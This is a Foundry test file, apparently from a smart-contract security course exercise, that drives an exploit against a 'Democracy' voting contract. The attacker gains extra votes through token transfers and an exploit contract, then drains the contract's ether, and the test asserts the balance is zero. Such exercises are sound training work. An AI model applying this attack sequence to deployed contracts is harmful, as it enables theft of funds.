// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import {Test, console2} from "forge-std/Test.sol";
import {Democracy, ExploitInitial, ExploitFinal} from "../../src/Week10-11/Democracy.sol";

// forge test --match-contract DemocracyTest -vvvv
contract DemocracyTest is Test {
    Democracy democracyContract;
    address owner;
    address attackerWallet;

    ExploitInitial exploitInitialContract;
    ExploitFinal exploitFinalContract;

    function setUp() public {
        democracyContract = new Democracy{value: 1 ether}();
        owner = address(0xdead);
        attackerWallet = address(0xbad);

        exploitFinalContract = new ExploitFinal(democracyContract, attackerWallet);
        exploitInitialContract = new ExploitInitial(democracyContract, attackerWallet, exploitFinalContract);
    }

    function testExploit() public {
        democracyContract.nominateChallenger(attackerWallet);
        assertEq(democracyContract.balanceOf(attackerWallet), 2);

        vm.startPrank(attackerWallet);
        democracyContract.safeTransferFrom(attackerWallet, address(exploitInitialContract), 1);
        democracyContract.vote(attackerWallet);

        exploitInitialContract.attack();
        democracyContract.withdrawToAddress(attackerWallet);
        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(address(democracyContract).balance, 0);
    }
}
